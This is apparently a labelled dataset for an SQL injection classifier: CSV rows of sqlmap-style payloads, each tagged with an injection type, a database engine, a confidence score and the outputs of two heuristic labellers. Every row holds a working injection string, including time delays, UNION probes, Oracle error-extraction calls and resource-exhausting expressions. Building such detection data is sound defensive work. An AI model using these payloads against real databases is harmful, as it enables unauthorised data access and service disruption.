payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,729,boolean_blind,generic,Pattern match: 'or 8526 = 1389' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt
1 ) where 7026 = 7026,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,730,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 7026 = 7026
"-6388'+ ( select 'jqld' where 8600 = 8600 union all select 8600,8600#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,731,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6388'+ ( select 'jqld' where 8600 = 8600 union all select 8600,8600#"
"1"" ) ) and 2006 = 2006",boolean_blind,generic,0.8,AND equality comparison,KEEP,,boolean_blind,generic,732,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) and 2006 = 2006"
"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,733,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,734,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl
"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,735,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --"
1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,736,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
"1%' ) ) union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,737,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null,null,null#"
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,0.85,extractvalue() for error extraction,KEEP,,error_based,mysql,738,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )"
"-6076"" ) ) or 8277 = 4757",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,739,boolean_blind,generic,Pattern match: 'or 8277 = 4757' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-6076"" ) ) or 8277 = 4757"
"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,740,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,741,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#"
1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,742,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
1' ) as upgb where 2031 = 2031,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,743,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as upgb where 2031 = 2031
"1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,744,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,745,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn"
select case when 2599 = 7035 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,746,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 2599 = 7035 then 1 else null end--
"1"" ) as eibf where 5026 = 5026 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,747,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" ) as eibf where 5026 = 5026 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"
select ( case when ( 8403 = 7151 ) then 8403 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,748,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 8403 = 7151 ) then 8403 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
1 ) where 9860 = 9860 and 4443 = 4111--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,749,boolean_blind,generic,Pattern match: 'and 4443 = 4111' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) where 9860 = 9860 and 4443 = 4111--
"1"" ) where 3122 = 3122 and sleep ( 5 ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,750,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) where 3122 = 3122 and sleep ( 5 ) #"
"1"" ) ) as eglv where 7412 = 7412 union all select null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,751,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as eglv where 7412 = 7412 union all select null#"
1 and sleep ( 5 ) -- ruuv,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,752,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 and sleep ( 5 ) -- ruuv
1 ) rlike ( select ( case when ( 8488 = 1270 ) then 1 else 0x28 end ) ),boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,753,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) rlike ( select ( case when ( 8488 = 1270 ) then 1 else 0x28 end ) )
"1%' union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,754,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null#"
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,755,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm"
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,756,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag"
"-2314%' ) ) union all select 4612,4612--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,757,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2314%' ) ) union all select 4612,4612--"
1%' and 7533 = 7533 and '%' = ',boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,758,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' and 7533 = 7533 and '%' = '
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,759,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1' ) where 8211 = 8211 union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,760,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 8211 = 8211 union all select null,null,null,null,null#"
"-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,761,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--"
"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,762,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp"
"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,763,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,764,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg"
"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,765,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --"
"-5891 union all select 7103,7103,7103,7103--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,766,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5891 union all select 7103,7103,7103,7103--"
"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,767,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb"
"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,768,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,769,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006
"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,770,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
1'+ ( select 'hcqf' where 9956 = 9956 and ( 2993 = 4297 ) *4297 ) +',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,771,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'hcqf' where 9956 = 9956 and ( 2993 = 4297 ) *4297 ) +'
-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,772,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--
"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,773,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"1'+ ( select afst where 7454 = 7454 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,774,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1'+ ( select afst where 7454 = 7454 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'"
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,775,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--"
"-7267 ) union all select 1912,1912,1912,1912,1912,1912,1912,1912--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,776,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7267 ) union all select 1912,1912,1912,1912,1912,1912,1912,1912--"
"1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,777,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--"
"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,778,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--"
"-4588"" union all select 4550,4550,4550,4550#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,779,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4588"" union all select 4550,4550,4550,4550#"
"-3971%' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,780,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-3971%' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( '%' = '"
1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,781,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
select ( case when ( 3863 = 1151 ) then 3863 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,782,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 3863 = 1151 ) then 3863 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,783,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--"
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""imlq"" like ""imlq",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,784,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""imlq"" like ""imlq"
1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,785,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd
1%' ) ) or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,786,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1%' ) ) or sleep ( 5 ) #
"1"" ) ) and make_set ( 1167 = 5027,5027 ) and ( ( ""grfi"" = ""grfi",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,787,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) and make_set ( 1167 = 5027,5027 ) and ( ( ""grfi"" = ""grfi"
"1%' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = '",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,788,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1%' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = '"
"1%"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""%"" = """,time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,789,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""%"" = """
-3088' or 6872 = 6872 and 'miwk' = 'miwk,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,790,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3088' or 6872 = 6872 and 'miwk' = 'miwk
"1%"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,791,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) where 1443 = 1443 union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,792,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 1443 = 1443 union all select null,null,null,null,null#"
1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,793,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
1'+ ( select mavu where 4276 = 4276 rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,794,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select mavu where 4276 = 4276 rlike sleep ( 5 ) #
-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,795,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi
"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,796,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
